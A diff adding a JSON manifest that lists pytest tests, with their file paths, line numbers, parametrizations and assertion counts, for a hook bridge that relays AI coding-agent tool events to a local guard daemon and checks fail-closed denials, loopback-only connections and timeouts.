@@ -1,0 +1,3292 @@
+[
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_timeout_continues_when_review_cannot_finish",
+    "line": 28,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('harness', 'expected'), [('copilot', {'permissionDecision': 'allow'}), ('grok', {'decision': 'allow'}), ('hermes', {'decision': 'allow'}), ('openclaw', {'decision': 'allow'})])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_timeout_allows_emergency_safe_read",
+    "line": 52,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_claude_shaped_timeout_continues_when_review_cannot_finish",
+    "line": 82,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness', ['kimi', 'zcode'])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_success_preserves_child_stdout_and_returncode",
+    "line": 106,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_empty_failed_child_continues_when_review_cannot_finish",
+    "line": 126,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_malformed_success_continues_when_review_cannot_finish",
+    "line": 146,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_copilot_permission_timeout_uses_permission_request_contract",
+    "line": 166,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_oversized_input_uses_configured_harness_native_deny",
+    "line": 186,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_invalid_frozen_args_deny_before_daemon_dispatch",
+    "line": 201,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_frozen_path_resolution_failure_denies_before_daemon_dispatch",
+    "line": 223,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_valid_frozen_args_retain_daemon_fast_path",
+    "line": 249,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_relative_frozen_guard_home_denies_before_daemon_dispatch",
+    "line": 276,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_bridge.py",
+    "name": "test_relative_configured_guard_home_denies_before_daemon_dispatch",
+    "line": 300,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_copilot_bridge_matches_published_cli_emitter",
+    "line": 24,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ('PreToolUse', 'preToolUse', 'PostToolUse', 'postToolUse'))",
+      "pytest.mark.parametrize('action', ('allow', 'warn', 'review', 'require-reapproval', 'sandbox-required', 'block'))"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_denial_and_ambiguous_authority_are_not_weakened",
+    "line": 72,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ('PreToolUse', 'PostToolUse'))",
+      "pytest.mark.parametrize('response', ({'policy_action': 'block', 'permissionDecision': 'allow'}, {'policy_action': 'review', 'decision': 'allow'}, {'policy_action': 'allow', 'decision': 'deny'}, {'policy_action': 'allow', 'hookSpecificOutput': {'permissionDecision': 'deny'}}, {'policy_action': 'allow', 'hookSpecificOutput': {'permissionDecision': 'ask'}}, {'policy_action': 'allow', 'permissionDecision': 'deny'}, {'policy_action': 'allow', 'model_output_action': 'block'}, {'policy_action': 'invalid', 'permissionDecision': 'allow'}, {'policy_action': [], 'permissionDecision': 'allow'}, {'permissionDecision': {}}, {'hookSpecificOutput': {'additionalContext': 'no decision'}}, {'decision': {}}, {}))"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_existing_native_allow_and_availability_reason_remain_intact",
+    "line": 82,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ('PreToolUse', 'PostToolUse'))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_watch_post_does_not_promote_observed_block_to_effective_denial",
+    "line": 92,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_post_block_emits_only_observational_native_fields_and_original_reason",
+    "line": 105,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_permission_request_uses_existing_separate_contract",
+    "line": 123,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_actual_registered_cli_entrypoint_delivers_native_json_on_both_routes",
+    "line": 142,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ('preToolUse', 'postToolUse'))",
+      "pytest.mark.parametrize('use_daemon', (True, False))",
+      "pytest.mark.parametrize('action', ('allow', 'block'))"
+    ],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_copilot_delivery.py",
+    "name": "test_fallback_error_exit_is_not_masked_by_a_native_allow_payload",
+    "line": 235,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('returncode', (1, 2, -9))"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_should_block_respects_guard_event_contract",
+    "line": 17,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_bridge_rewrites_daemon_review_after_wait",
+    "line": 25,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_review_translation_keeps_wait_metadata",
+    "line": 54,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_empty_observe_response_matches_native_success",
+    "line": 85,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event_name', ['UserPromptSubmit', 'SessionStart', 'SessionEnd', 'SubagentStart', 'SubagentStop', 'PostToolUse', 'PermissionDenied'])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_benign_prompt_succeeds_via_daemon_and_subprocess",
+    "line": 105,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('use_daemon', [True, False])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_prompt_native_block_is_preserved",
+    "line": 157,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_nonempty_ambiguous_prompt_response_fails_closed",
+    "line": 176,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('response', [{'unexpected': 'nonempty'}, {'policy_action': 'invalid', 'reason': 'malformed prompt policy'}])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_ambiguous_pretool_response_fails_closed",
+    "line": 199,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('response', [{}, {'unexpected': 'nonempty'}, {'policy_action': 'invalid', 'reason': 'malformed policy'}])"
+    ],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_daemon_dangerous_pretool_block_keeps_reason",
+    "line": 212,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_bridge_clamps_wait_to_remaining_seconds",
+    "line": 233,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_daemon.py",
+    "name": "test_grok_bridge_preserves_daemon_result_when_store_fails",
+    "line": 261,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_policy_block_cannot_be_weakened_by_native_allow",
+    "line": 20,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('harness', 'expected_code'), [('grok', 2), ('openclaw', 0), ('kimi', 2), ('pi', 2), ('zcode', 2)])"
+    ],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_native_deny_promotes_allow_policy_to_block",
+    "line": 46,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_review_denial_is_byte_semantically_preserved_and_waitable",
+    "line": 67,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_review_policy_repairs_native_allow_without_losing_metadata",
+    "line": 87,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_watch_and_recording_native_allow_are_preserved",
+    "line": 113,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('policy_action', ['allow', 'warn'])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_recording_only_allow_without_policy_metadata_is_preserved",
+    "line": 130,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_top_level_deny_cannot_be_masked_by_nested_allow",
+    "line": 137,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_lifecycle_envelope_without_decision_is_unchanged",
+    "line": 153,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_present_invalid_authority_fails_closed_without_mutating_input",
+    "line": 191,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('original', [{'decision': 'allow', 'policy_action': 'invalid'}, {'decision': 'bogus'}, {'decision': 7}, {'decision': 'allow', 'hookSpecificOutput': {'hookEventName': 'PreToolUse', 'permissionDecision': 'bogus'}}, {'decision': 'allow', 'hookSpecificOutput': {'hookEventName': 'PreToolUse', 'permissionDecision': None}}])"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_lifecycle_present_invalid_authority_is_not_promoted_to_a_gate",
+    "line": 204,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_restrictive_tool_policy_materializes_missing_native_authority",
+    "line": 228,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('harness', 'policy_action', 'expected_permission', 'expected_top'), [('grok', 'block', 'deny', 'deny'), ('openclaw', 'review', 'ask', 'deny'), ('codex', 'block', 'deny', None), ('claude-code', 'review', 'ask', None)])"
+    ],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_restrictive_policy_reconstructs_malformed_tool_envelope",
+    "line": 260,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_invalid_present_policy_materializes_stdout_denial_for_tool_envelope",
+    "line": 285,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('harness', ['openclaw', 'codex'])"
+    ],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_native_consistency.py",
+    "name": "test_restrictive_prompt_policy_materializes_top_level_block",
+    "line": 311,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('policy_action', ['block', 'review'])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_timeout_allows_grok_when_watch",
+    "line": 58,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_pretty_printed_hook_json_is_accepted",
+    "line": 91,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_timeout_allows_grok_when_watch_has_expired",
+    "line": 113,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_oversized_input_allows_grok_when_watch",
+    "line": 149,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_oversized_input_preserves_kimi_event_when_watch",
+    "line": 169,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_bounded_cli_hook_watch_continue.py",
+    "name": "test_timeout_continues_post_tool_for_grok",
+    "line": 196,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_assert_loopback_http_url_rejects_remote_host",
+    "line": 54,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_daemon_url_rejects_non_loopback_fallback",
+    "line": 59,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_post_to_loopback_daemon_ignores_http_proxy",
+    "line": 93,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_post_to_loopback_daemon_does_not_send_token_before_identity_proof",
+    "line": 135,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_post_to_loopback_daemon_enforces_absolute_streaming_deadline",
+    "line": 162,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('handler', [_StreamingDaemonHandler, _StreamingErrorDaemonHandler])"
+    ],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_main_degrades_when_daemon_returns_malformed_json",
+    "line": 190,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_run_local_fallback_degrades_invalid_json",
+    "line": 224,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_degraded_pretool_allows_emergency_safe_read",
+    "line": 237,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_valid_hook_json_degrades_empty_daemon_body",
+    "line": 253,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_daemon_response_body_is_size_bounded",
+    "line": 265,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_oversized_hook_input_fails_safe_without_daemon_contact",
+    "line": 275,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_oversized_permission_request_uses_nested_deny",
+    "line": 294,
+    "declared_parametrization": [],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_bridge_timeouts_stay_under_harness_budget",
+    "line": 309,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_main_recovers_missing_daemon_and_retries_hook",
+    "line": 317,
+    "declared_parametrization": [],
+    "assertion_count": 11,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_authenticated_daemon_failure_denies_without_local_fallback",
+    "line": 382,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_authenticated_failure_denies_permission_request_behavior",
+    "line": 410,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_recovery_only_restarts_for_transport_and_server_failures",
+    "line": 427,
+    "declared_parametrization": [],
+    "assertion_count": 12,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_fallback_timeout_kills_descendants",
+    "line": 452,
+    "declared_parametrization": [
+      "pytest.mark.skipif(os.name == 'nt', reason='POSIX process-group assertion')"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_recovery_command_preserves_custom_home_and_guard_home",
+    "line": 470,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_daemon_hook_bridge.py",
+    "name": "test_loopback_redirect_handler_rejects_remote_redirect",
+    "line": 485,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_completion_contract.py",
+    "name": "test_daemon_output_keeps_decision_and_completion_separate",
+    "line": 26,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('decision', ['allow', 'deny'])",
+      "pytest.mark.parametrize('suppressed', [False, True])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_completion_contract.py",
+    "name": "test_oversized_input_denies_without_contacting_daemon",
+    "line": 39,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_completion_contract.py",
+    "name": "test_local_fallback_denial_is_emitted_once",
+    "line": 50,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_exit_paths.py",
+    "name": "test_success_writes_once_or_suppresses_only_success",
+    "line": 56,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('response', 'suppress', 'expected'), [('{}', False, '{}'), ('', False, '{}'), ('  ', False, '{}'), ('{\"decision\":\"deny\"}', False, '{\"decision\":\"deny\"}'), ('{}', True, '')])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_exit_paths.py",
+    "name": "test_failure_output_is_never_suppressed_or_replaced",
+    "line": 74,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('failure', ['state', 'authenticated', 'recoverable', 'unavailable'])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_claude_hook_exit_paths.py",
+    "name": "test_oversized_input_preserves_event_denial_without_contacting_daemon",
+    "line": 101,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('event', ['PreToolUse', 'PermissionRequest', 'UserPromptSubmit', 'PostToolUse', 'Stop', 'unknown'])"
+    ],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_hook_root_matches_vscode_and_core_global_directory",
+    "line": 95,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_frozen_cline_plugin_persists_signed_executable_command",
+    "line": 102,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_hook_slots_are_platform_canonical_and_non_destructive",
+    "line": 120,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_posix_wrapper_pins_python_and_isolation_flags",
+    "line": 130,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_windows_wrapper_uses_isolated_python_and_fails_closed",
+    "line": 137,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_cline_canary_uses_only_the_canonical_managed_slot",
+    "line": 144,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_cline_powershell_command_never_uses_ambient_path",
+    "line": 175,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_cline_saved_custom_root_survives_environment_change",
+    "line": 190,
+    "declared_parametrization": [],
+    "assertion_count": 6,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_cline_state_cannot_execute_or_remove_managed_files_outside_canonical_slots",
+    "line": 248,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_pretool_continues_inspection_when_guard_is_unavailable",
+    "line": 281,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_pretool_pauses_mutation_when_guard_is_unavailable",
+    "line": 294,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_pretool_validates_every_command_when_guard_is_unavailable",
+    "line": 307,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_pretool_fans_out_cline_parallel_commands",
+    "line": 323,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_native_pretool_rejects_oversized_input_before_guard",
+    "line": 343,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_cline_hook_transports.py",
+    "name": "test_generated_plugin_syntax_pretool_block_and_posttool_replacement",
+    "line": 356,
+    "declared_parametrization": [],
+    "assertion_count": 7,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_assert_loopback_http_url_rejects_remote_and_credentialed_urls",
+    "line": 67,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_daemon_url_accepts_only_authenticated_ipv4_and_ipv6_loopback_state",
+    "line": 83,
+    "declared_parametrization": [
+      "pytest.mark.parametrize(('host', 'expected_url'), [('127.0.0.1', 'http://127.0.0.1:5474'), ('localhost', 'http://localhost:5474'), ('::1', 'http://[::1]:5474')])"
+    ],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_daemon_url_requires_authenticated_guard_owned_state",
+    "line": 99,
+    "declared_parametrization": [],
+    "assertion_count": 0,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_fail_closed_uses_supported_codex_deny_shapes",
+    "line": 116,
+    "declared_parametrization": [],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_keeps_inline_browser_wait_within_consumer_limit",
+    "line": 128,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_unavailable_prompt_warns_without_stopping_conversation",
+    "line": 151,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_launcher_integrity_failure_does_not_stop_user_prompt",
+    "line": 168,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_launcher_integrity_failure_still_denies_pretool_use",
+    "line": 195,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_codex_post_tool_response_excludes_daemon_metadata",
+    "line": 224,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_failed_daemon_identity_never_receives_token_or_hook_payload",
+    "line": 261,
+    "declared_parametrization": [
+      "pytest.mark.parametrize('challenge_mode', [pytest.param('wrong-proof', id='stale-port-reused-by-unproven-process'), pytest.param('expired', id='stale-expired-challenge'), pytest.param('redirect', id='redirect-refused')])"
+    ],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_authenticated_generation_rollover_is_rediscovered_once",
+    "line": 288,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_authenticated_trust_refresh_preserves_daemon_generation",
+    "line": 314,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_repeated_generation_rollover_stays_bounded",
+    "line": 344,
+    "declared_parametrization": [],
+    "assertion_count": 1,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_tampered_state_is_rejected_before_candidate_contact",
+    "line": 365,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_non_private_discovery_files_never_release_token_or_hook_payload",
+    "line": 397,
+    "declared_parametrization": [
+      "pytest.mark.skipif(os.name == 'nt', reason='POSIX mode enforcement')",
+      "pytest.mark.parametrize('private_file', ['daemon-state.json', 'daemon-discovery-key', 'daemon-auth-token'])"
+    ],
+    "assertion_count": 4,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_missing_token_never_falls_back_to_mutable_state",
+    "line": 423,
+    "declared_parametrization": [],
+    "assertion_count": 5,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_authenticates_real_daemon_before_hook_delivery",
+    "line": 449,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_uses_payload_cwd_for_bounded_compound_read",
+    "line": 492,
+    "declared_parametrization": [],
+    "assertion_count": 2,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_emits_schema_exact_post_tool_response",
+    "line": 529,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
+  {
+    "path": "tests/test_codex_daemon_hook_bridge.py",
+    "name": "test_bridge_real_daemon_prefers_payload_cwd_for_verified_git_fetch",
+    "line": 570,
+    "declared_parametrization": [],
+    "assertion_count": 3,
+    "static_only": true
+  },
